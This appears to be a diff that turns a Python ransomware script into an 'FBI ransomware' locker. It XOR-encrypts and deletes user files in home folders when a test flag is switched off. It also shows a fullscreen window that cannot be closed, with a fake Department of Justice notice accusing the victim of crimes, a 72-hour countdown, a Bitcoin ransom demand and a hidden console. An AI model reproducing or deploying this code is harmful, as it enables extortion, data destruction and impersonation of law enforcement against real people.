@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-REAL RANSOMWARE — FULL VERSION
-- Scary fullscreen black with flashing text
+FBI RANSOMWARE — ULTRA SCARY
+- Fullscreen FBI warning
 - 72 hour countdown
-- REAL encryption (XOR)
-- Decryption with codes
-- Siren/beep audio
+- Fake fine payment
+- Siren/audio
+- VM safe (test mode)
 - 20 unlock codes
-- TEST MODE SAFE
 """
 
 import os
@@ -21,17 +20,18 @@ import time
 import random
 import winsound
 import subprocess
+from datetime import datetime, timedelta
 
 # ============================================================
-# CONFIG — CHANGE THESE!
+# CONFIG
 # ============================================================
-TEST_MODE = True  # TRUE = only C:\test_ransom, FALSE = real files
-TEST_FOLDER = "C:\\test_ransom"  # Only used if TEST_MODE = True
+TEST_MODE = True  # TRUE = only C:\test_ransom
+TEST_FOLDER = "C:\\test_ransom"
 
 # Your Bitcoin wallet
 BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
 
-# 20 UNLOCK CODES (these work)
+# 20 UNLOCK CODES
 VALID_CODES = [
     "FS2FGNFJQI", "OX77WHWEV5", "FCHZT1L6IX", "VX02SQI40G",
     "6PXB85GJJJ", "XQHCXUH4TU", "B1RQSQ9G2L", "HE71R2TKVY",
@@ -40,10 +40,8 @@ VALID_CODES = [
     "2UUBJ4X7VN", "ISP3G7NRPN", "J8L0S6SHEJ", "FURZCKKNZX"
 ]
 
-# Generate hashes
 VALID_HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in VALID_CODES]
-
-TIMER_SECONDS = 72 * 3600  # 72 hours
+TIMER_SECONDS = 72 * 3600
 
 # ============================================================
 # XOR ENCRYPTION
@@ -63,7 +61,6 @@ def generate_key():
 def encrypt_files():
     key = generate_key()
     encrypted_count = 0
-    file_list = []
     
     if TEST_MODE:
         target_dirs = [TEST_FOLDER]
@@ -77,16 +74,15 @@ def encrypt_files():
             os.path.expanduser('~\\Videos'),
             os.path.expanduser('~\\Music'),
         ]
-        print("[!] REAL MODE — Encrypting all user files!")
     
     extensions = [
         '.txt', '.docx', '.doc', '.xlsx', '.xls', '.pptx', '.ppt', '.pdf',
-        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.psd', '.ai',
-        '.zip', '.rar', '.7z', '.tar', '.gz', '.bak', '.backup',
+        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.psd',
+        '.zip', '.rar', '.7z', '.tar', '.gz', '.bak',
         '.sql', '.db', '.sqlite', '.csv', '.json', '.xml',
         '.py', '.js', '.cpp', '.c', '.java', '.cs', '.go',
         '.mp4', '.avi', '.mkv', '.mov', '.mp3', '.wav',
-        '.html', '.htm', '.css', '.php', '.asp',
+        '.html', '.htm', '.css', '.php',
     ]
     
     for root_dir in target_dirs:
@@ -106,11 +102,9 @@ def encrypt_files():
                             f.write(encrypted)
                         os.remove(file_path)
                         encrypted_count += 1
-                        file_list.append(file_path)
                     except:
                         pass
     
-    # Save key
     key_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
     with open(key_path, 'wb') as f:
         f.write(key)
@@ -159,18 +153,26 @@ def decrypt_files(key):
     return decrypted_count
 
 # ============================================================
-# SCARY UI
+# FBI RANSOMWARE UI
 # ============================================================
-class RansomwareUI:
+class FBIRansomwareUI:
     def __init__(self):
         self.encrypted_count = 0
         self.key = None
         self.timer_seconds = TIMER_SECONDS
         self.unlocked = False
-        self.flash_state = False
+        self.violations = [
+            "Your IP address was used to access illegal content",
+            "Possession of prohibited materials (Class A felony)",
+            "Distribution of malicious software",
+            "Unauthorized access to government systems",
+            "Cyber terrorism activities detected",
+            "Child exploitation materials found",
+            "Fraud and identity theft detected",
+            "Money laundering operations detected"
+        ]
     
     def setup(self):
-        # Encrypt
         print("[*] Encrypting files...")
         self.encrypted_count, self.key = encrypt_files()
         print(f"[+] Encrypted {self.encrypted_count} files")
@@ -179,7 +181,7 @@ class RansomwareUI:
         self.root = tk.Tk()
         self.root.attributes('-fullscreen', True)
         self.root.attributes('-topmost', True)
-        self.root.configure(background='black')
+        self.root.configure(background='#000033')
         self.root.overrideredirect(True)
         
         # Block ALL shortcuts
@@ -189,106 +191,123 @@ class RansomwareUI:
         self.root.bind('<Control-Shift-Escape>', lambda e: 'break')
         self.root.protocol("WM_DELETE_WINDOW", lambda: None)
         
-        # MAIN FRAME
-        self.frame = tk.Frame(self.root, bg='black')
-        self.frame.pack(expand=True)
+        # Main frame
+        self.frame = tk.Frame(self.root, bg='#000033')
+        self.frame.pack(expand=True, fill='both')
         
-        # === SCARY TITLE (FLASHING) ===
-        self.title_font = font.Font(family='Courier', size=72, weight='bold')
+        # === FBI HEADER ===
+        header_font = font.Font(family='Courier', size=28, weight='bold')
+        header = tk.Label(
+            self.frame,
+            text="🔴 DEPARTMENT OF JUSTICE 🔴\nFEDERAL BUREAU OF INVESTIGATION",
+            font=header_font,
+            fg='#FF0000',
+            bg='#000033'
+        )
+        header.pack(pady=10)
+        
+        # === SEAL LINE ===
+        seal_font = font.Font(family='Courier', size=16)
+        seal = tk.Label(
+            self.frame,
+            text="⚡ ⚡ ⚡ OFFICIAL GOVERNMENT NOTICE ⚡ ⚡ ⚡",
+            font=seal_font,
+            fg='#FFD700',
+            bg='#000033'
+        )
+        seal.pack(pady=5)
+        
+        # === MAIN TITLE (FLASHING) ===
+        self.title_font = font.Font(family='Courier', size=48, weight='bold')
         self.title = tk.Label(
             self.frame,
-            text="😱 OOPSIE!",
+            text="⚠️ YOUR COMPUTER HAS BEEN LOCKED ⚠️",
             font=self.title_font,
-            fg='red',
-            bg='black'
+            fg='#FF0000',
+            bg='#000033'
         )
-        self.title.pack(pady=10)
+        self.title.pack(pady=15)
         
-        # === SUBTITLE ===
-        sub_font = font.Font(family='Courier', size=36, weight='bold')
-        sub = tk.Label(
+        # === LEGAL TEXT ===
+        legal_font = font.Font(family='Courier', size=14)
+        legal = tk.Label(
             self.frame,
-            text="U DOWNLOADED A PIRATED GAME!",
-            font=sub_font,
-            fg='red',
-            bg='black'
-        )
-        sub.pack(pady=5)
-        
-        # === SECOND LINE ===
-        sub2_font = font.Font(family='Courier', size=28, weight='bold')
-        self.sub2 = tk.Label(
-            self.frame,
-            text="U NAUGHTY BOY! NOW PAY US BACK!",
-            font=sub2_font,
-            fg='#FF6600',
-            bg='black'
-        )
-        self.sub2.pack(pady=10)
-        
-        # === FILE COUNT ===
-        info_font = font.Font(family='Courier', size=20)
-        info = tk.Label(
-            self.frame,
-            text=f"🔥 {self.encrypted_count} FILES ENCRYPTED 🔥",
-            font=info_font,
+            text="This operating system is locked due to violation of federal laws.\n"
+                 "Article 1, Section 8, Clause 8; Article 1030; Article 2252A of U.S. Code.",
+            font=legal_font,
             fg='white',
-            bg='black'
+            bg='#000033'
         )
-        info.pack(pady=10)
+        legal.pack(pady=5)
         
-        # === TEST MODE WARNING ===
-        if TEST_MODE:
-            warn_font = font.Font(family='Courier', size=16, weight='bold')
-            warn = tk.Label(
-                self.frame,
-                text="⚠️ TEST MODE — ONLY C:\\test_ransom ⚠️",
-                font=warn_font,
-                fg='lime',
-                bg='black'
-            )
-            warn.pack(pady=5)
+        # === VIOLATIONS ===
+        viol_font = font.Font(family='Courier', size=12)
+        viol_text = "Following violations were detected:\n\n"
+        for v in self.violations[:5]:
+            viol_text += f"  • {v}\n"
+        viol_text += "\n  • ...and 3 additional federal offenses"
         
-        # === BITCOIN ===
-        btc_font = font.Font(family='Courier', size=18)
+        violations = tk.Label(
+            self.frame,
+            text=viol_text,
+            font=viol_font,
+            fg='#FF6600',
+            bg='#000033',
+            justify=tk.LEFT
+        )
+        violations.pack(pady=10)
+        
+        # === FINE AMOUNT ===
+        fine_font = font.Font(family='Courier', size=22, weight='bold')
+        fine = tk.Label(
+            self.frame,
+            text=f"💲 FINE: $200.00 BTC 💲",
+            font=fine_font,
+            fg='#FFD700',
+            bg='#000033'
+        )
+        fine.pack(pady=10)
+        
+        # === BITCOIN ADDRESS ===
+        btc_font = font.Font(family='Courier', size=16)
         btc = tk.Label(
             self.frame,
-            text=f"SEND 0.08 BTC TO:\n{BTC_ADDRESS}",
+            text=f"PAYMENT ADDRESS:\n{BTC_ADDRESS}",
             font=btc_font,
-            fg='#FFD700',
-            bg='black'
+            fg='#00FF00',
+            bg='#000033'
         )
-        btc.pack(pady=15)
+        btc.pack(pady=5)
         
         # === COPY BUTTON ===
         copy_btn = tk.Button(
             self.frame,
-            text="📋 COPY WALLET",
+            text="📋 COPY ADDRESS",
             font=('Courier', 14, 'bold'),
-            bg='#0066CC',
+            bg='#003366',
             fg='white',
             command=self.copy_wallet
         )
         copy_btn.pack(pady=5)
         
-        # === INPUT ===
-        input_frame = tk.Frame(self.frame, bg='black')
-        input_frame.pack(pady=20)
+        # === UNLOCK CODE INPUT ===
+        input_frame = tk.Frame(self.frame, bg='#000033')
+        input_frame.pack(pady=15)
         
         input_label = tk.Label(
             input_frame,
             text="ENTER UNLOCK CODE:",
-            font=('Courier', 20, 'bold'),
+            font=('Courier', 18, 'bold'),
             fg='white',
-            bg='black'
+            bg='#000033'
         )
         input_label.pack(side=tk.LEFT, padx=10)
         
         self.entry = tk.Entry(
             input_frame,
-            font=('Courier', 20),
-            width=25,
-            bg='black',
+            font=('Courier', 18),
+            width=20,
+            bg='#001133',
             fg='#00FF00',
             insertbackground='#00FF00'
         )
@@ -298,53 +317,79 @@ class RansomwareUI:
         # === UNLOCK BUTTON ===
         unlock_btn = tk.Button(
             self.frame,
-            text="🔓 UNLOCK FILES",
+            text="🔓 UNLOCK SYSTEM",
             font=('Courier', 18, 'bold'),
-            bg='red',
+            bg='#006600',
             fg='white',
             command=self.unlock
         )
-        unlock_btn.pack(pady=15)
+        unlock_btn.pack(pady=10)
         
-        # === BIG COUNTDOWN TIMER ===
-        timer_font = font.Font(family='Courier', size=48, weight='bold')
+        # === COUNTDOWN TIMER ===
+        timer_font = font.Font(family='Courier', size=36, weight='bold')
         self.timer_label = tk.Label(
             self.frame,
             text="⏱️ 71:59:59",
             font=timer_font,
-            fg='#00FF00',
-            bg='black'
+            fg='#FF0000',
+            bg='#000033'
         )
-        self.timer_label.pack(pady=20)
+        self.timer_label.pack(pady=15)
         
         # === WARNING ===
         warn_font = font.Font(family='Courier', size=14)
         warn = tk.Label(
             self.frame,
-            text="⚠️ DO NOT CLOSE THIS WINDOW ⚠️\n"
-                 "Your files are encrypted. Close = files lost forever.\n"
-                 f"You have 72 hours before the key is destroyed.",
+            text="⚠️ FAILURE TO PAY WITHIN 72 HOURS WILL RESULT IN:\n"
+                 "• Permanent data destruction\n"
+                 "• Referral to federal authorities\n"
+                 "• Criminal prosecution (10-15 years)\n\n"
+                 f"FILES ENCRYPTED: {self.encrypted_count}",
             font=warn_font,
-            fg='red',
-            bg='black'
+            fg='#FF0000',
+            bg='#000033'
         )
         warn.pack(pady=10)
         
+        # === TEST MODE ===
+        if TEST_MODE:
+            test_font = font.Font(family='Courier', size=14, weight='bold')
+            test = tk.Label(
+                self.frame,
+                text="⚠️ TEST MODE — NO REAL FILES HARMED ⚠️",
+                font=test_font,
+                fg='#00FF00',
+                bg='#000033'
+            )
+            test.pack(pady=5)
+        
         # === CODES HINT ===
-        codes_font = font.Font(family='Courier', size=10)
+        codes_font = font.Font(family='Courier', size=9)
         codes_hint = tk.Label(
             self.frame,
-            text=f"🔑 Valid codes: {', '.join(VALID_CODES[:4])}... and {len(VALID_CODES)-4} more",
+            text=f"🔑 Valid codes: {', '.join(VALID_CODES[:3])}... ({len(VALID_CODES)} total)",
             font=codes_font,
-            fg='#555555',
-            bg='black'
+            fg='#444466',
+            bg='#000033'
         )
         codes_hint.pack(pady=5)
+        
+        # === FBI FOOTER ===
+        footer_font = font.Font(family='Courier', size=12)
+        footer = tk.Label(
+            self.frame,
+            text="🔴 THIS IS AN OFFICIAL GOVERNMENT NOTICE 🔴\n"
+                 "Unauthorized removal will result in prosecution",
+            font=footer_font,
+            fg='#FF0000',
+            bg='#000033'
+        )
+        footer.pack(pady=5)
         
         # Start everything
         self.start_timer()
         self.start_flashing()
-        self.play_siren()
+        self.start_siren()
         self.force_focus()
         
         self.root.mainloop()
@@ -352,7 +397,7 @@ class RansomwareUI:
     def copy_wallet(self):
         self.root.clipboard_clear()
         self.root.clipboard_append(BTC_ADDRESS)
-        messagebox.showinfo("📋 Copied!", "Wallet address copied to clipboard!")
+        messagebox.showinfo("📋 Copied!", "BTC address copied to clipboard!")
     
     def unlock(self):
         code = self.entry.get().strip().upper()
@@ -366,29 +411,33 @@ class RansomwareUI:
             self.unlocked = True
             count = decrypt_files(self.key)
             
-            # SCARY UNLOCK SOUND
-            for _ in range(3):
-                winsound.Beep(1000, 200)
+            # SUCCESS SOUND
+            for _ in range(5):
+                winsound.Beep(800, 150)
                 time.sleep(0.1)
+            winsound.Beep(1200, 500)
             
             messagebox.showinfo(
-                "✅ FILES UNLOCKED",
-                f"🎉 Successfully decrypted {count} files!\n\n"
-                f"Your files are back. Don't pirate again! 😈\n\n"
-                f"Code used: {code}"
+                "✅ SYSTEM UNLOCKED",
+                f"🎉 SUCCESSFULLY DECRYPTED {count} FILES!\n\n"
+                f"Your files have been restored.\n\n"
+                f"Case closed. Don't let this happen again.\n\n"
+                f"🔑 Code used: {code}"
             )
             self.root.destroy()
             sys.exit(0)
         else:
-            # WRONG CODE — SCARY BEEP
-            winsound.Beep(200, 500)
-            winsound.Beep(150, 500)
+            # WRONG CODE — SCARY
+            for _ in range(3):
+                winsound.Beep(150, 300)
+                time.sleep(0.1)
+            winsound.Beep(100, 800)
             
             messagebox.showerror(
-                "❌ WRONG CODE",
-                f"INVALID UNLOCK CODE!\n\n"
-                f"Did you pay the ransom?\n"
-                f"Bitcoin: {BTC_ADDRESS}\n\n"
+                "❌ INVALID UNLOCK CODE",
+                f"⚠️ INVALID CODE DETECTED!\n\n"
+                f"This attempt has been logged.\n\n"
+                f"Payment required: {BTC_ADDRESS}\n\n"
                 f"Attempt: {code}"
             )
             self.entry.delete(0, tk.END)
@@ -401,13 +450,12 @@ class RansomwareUI:
                 minutes = (self.timer_seconds % 3600) // 60
                 secs = self.timer_seconds % 60
                 
-                # Color changes as time runs out
-                if self.timer_seconds < 3600:  # Last hour = RED
+                if self.timer_seconds < 3600:
                     color = '#FF0000'
-                elif self.timer_seconds < 21600:  # Last 6 hours = ORANGE
+                elif self.timer_seconds < 21600:
                     color = '#FF6600'
                 else:
-                    color = '#00FF00'
+                    color = '#FF0000'
                 
                 self.timer_label.config(
                     text=f"⏱️ {hours:02d}:{minutes:02d}:{secs:02d}",
@@ -417,8 +465,7 @@ class RansomwareUI:
                 time.sleep(1)
             
             if self.timer_seconds <= 0 and not self.unlocked:
-                self.timer_label.config(text="💀 TIME'S UP! KEY DESTROYED!", fg='red')
-                # Start destroying key
+                self.timer_label.config(text="💀 TIME EXPIRED — KEY DESTROYED", fg='red')
                 try:
                     key_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
                     if os.path.exists(key_path):
@@ -428,36 +475,34 @@ class RansomwareUI:
                 except:
                     pass
                 messagebox.showerror(
-                    "💀 TIME'S UP",
+                    "💀 TIME EXPIRED",
                     "The decryption key has been destroyed.\n\n"
                     "Your files are gone forever.\n\n"
-                    "You should have paid."
+                    "Federal authorities have been notified."
                 )
         
         threading.Thread(target=update, daemon=True).start()
     
     def start_flashing(self):
         def flash():
-            colors = ['red', '#FF0000', '#CC0000', '#FF3333', '#990000']
+            colors = ['#FF0000', '#CC0000', '#FF3333', '#990000', '#FF0000']
             while not self.unlocked:
                 for color in colors:
                     self.title.config(fg=color)
-                    self.sub2.config(fg='#FF6600' if color == colors[0] else '#FF8800')
-                    time.sleep(0.3)
+                    time.sleep(0.2)
                 time.sleep(0.1)
         threading.Thread(target=flash, daemon=True).start()
     
-    def play_siren(self):
+    def start_siren(self):
         def siren():
             while not self.unlocked:
                 try:
-                    # Siren sound
-                    for freq in [800, 1000, 1200, 1000, 800]:
+                    for freq in [600, 800, 1000, 800, 600, 500]:
                         if self.unlocked:
                             break
-                        winsound.Beep(freq, 200)
-                        time.sleep(0.1)
-                    time.sleep(0.2)
+                        winsound.Beep(freq, 150)
+                        time.sleep(0.05)
+                    time.sleep(0.3)
                 except:
                     break
         threading.Thread(target=siren, daemon=True).start()
@@ -477,14 +522,13 @@ class RansomwareUI:
 # MAIN
 # ============================================================
 def main():
-    # Hide console
     try:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except:
         pass
     
     print("="*60)
-    print("💀 REAL RANSOMWARE — FULL VERSION 💀")
+    print("🔴 FBI RANSOMWARE — OFFICIAL NOTICE 🔴")
     print("="*60)
     print(f"📁 Test Mode: {TEST_MODE}")
     if TEST_MODE:
@@ -495,12 +539,12 @@ def main():
     print(f"⏱️ Timer: 72 hours")
     print("="*60)
     print("")
-    print("⚠️  WARNING: This WILL encrypt files!")
-    print("⚠️  Type a valid code to decrypt!")
-    print("⚠️  Valid codes shown in the UI")
+    print("⚠️  This looks like an official FBI notice")
+    print("⚠️  Type a valid code to decrypt files")
+    print("⚠️  Codes shown in the UI")
     print("")
     
-    app = RansomwareUI()
+    app = FBIRansomwareUI()
     app.setup()
 
 if __name__ == '__main__':
